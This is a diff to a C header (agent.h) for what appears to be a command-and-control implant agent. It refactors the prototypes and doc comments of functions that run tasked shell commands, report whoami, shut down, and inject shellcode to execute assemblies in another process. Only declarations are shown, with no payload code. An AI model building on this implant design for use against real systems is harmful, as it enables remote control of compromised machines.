@@ -207,7 +207,7 @@ VOID AgentSleep(_In_ PAPI api, _In_ Agent* agent);
  *
  * @brief Executes a function and returns the result
  *
- * @param _In_ PAPI api:
+ * @param _In_ Agent* agent:
  * @param _In_ PESG_STD_API pEsgStdApi:
  * @param _Out_opt_ DLL* pEsgStdDll: pointer to the standard esg dll that may be freed if a Task requires so
  * @param _In_ Task task: a Task struct to use to run a task
@@ -223,7 +223,7 @@ VOID AgentSleep(_In_ PAPI api, _In_ Agent* agent);
  * @note If execution fails, the return is FALSE otherwise the return is TRUE.
  * @note If execution fails, the data pointed to by `pTaskResult` will be NULL. Ensure to check this before using the result.
  */
-BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ DLL* pEsgStdDll, _In_ Task task, _Out_ CHAR** pTaskResult, _Out_ DWORD* pdwSizeOfOutput);
+BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ DLL* pEsgStdDll, _In_ Task task, _Out_ CHAR** pTaskResult, _Out_ DWORD* pdwSizeOfOutput);
 
 
 /**
@@ -235,7 +235,7 @@ BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgSt
  * with the task, and returns the result of the execution. The result is provided as a string along with its size.
  * The function is a private function that should not be used outside agent.c
  *
- * @param _In_ PAPI api: A pointer to the API strucutre
+ * @param _In_ Agent* agent: A pointer to the Agent strucutre
  * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
  * @param _In_ Task task: The task to be executed, which contains the command details.
  * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the command execution.
@@ -247,7 +247,7 @@ BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgSt
  *       before calling this function. The caller is responsible for freeing the memory allocated for
  *       taskResult after use.
  */
-BOOL _AgentExecuteCmd(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput);
+BOOL _AgentExecuteCmd(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput);
 
 
 /**
@@ -259,7 +259,7 @@ BOOL _AgentExecuteCmd(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task tas
  * and returns the result of the execution. The result is provided as a string along with its size.
  * The function is a private function that should not be used outside of agent.c
  *
- * @param _In_ PAPI api: A pointer to the API strucutre
+ * @param _In_ Agent* agent: A pointer to the Agent strucutre
  * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
  * @param _In_ Task task: The task to be executed.
  * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the task.
@@ -271,7 +271,7 @@ BOOL _AgentExecuteCmd(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task tas
  *       before calling this function. The caller is responsible for freeing the memory allocated for
  *       taskResult after use.
  */
-BOOL _AgentExecuteWhoami(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi,  _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput);
+BOOL _AgentExecuteWhoami(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi,  _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput);
 
 
 /**
@@ -283,7 +283,6 @@ BOOL _AgentExecuteWhoami(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi,  _In_ Task
  * it cleans up allocated resources and terminates the current thread.
  *
  * @param _In_ Agent* agent: A pointer to the Agent structure
- * @param _In_ PAPI api: A pointer to the API structure
  * @param _Out_ DLL* pEsgStdDll: A pointer to a DLL structure that will be freed and set to NULL after the operation
  * @param _In_ Task task: The Task structure that contains details about the task being executed
  *
@@ -293,7 +292,7 @@ BOOL _AgentExecuteWhoami(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi,  _In_ Task
  *       However, it's still accounted for to be future proof.
  *
  */
-BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdDll, _In_ Task task);
+BOOL _AgentExecuteShutdown(_In_ Agent* agent, _Out_ DLL* pEsgStdDll, _In_ Task task);
 
 
 /**
@@ -309,8 +308,6 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdD
  *
  * @param _In_ Agent* agent: A pointer to the Agent structure that contains information about
  *                           the agent performing the assembly execution.
- * @param _In_ PAPI api: A pointer to the API structure that provides memory allocation and
- *                       other utility functions.
  * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the standard API structure that contains the
  *                                      function for injecting code into a process.
  * @param _Out_ CHAR** pTaskResult: A pointer to a character pointer that will be allocated
@@ -326,7 +323,7 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdD
  *       the caller to avoid memory leaks. The function does not handle errors
  *       related to the retrieval of the shellcode or the injection process.
  */
-BOOL _AgentExecuteAssembly(_In_ Agent* agent, _In_ PAPI api, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput);
+BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput);
 
 #endif // AGENT_H
 
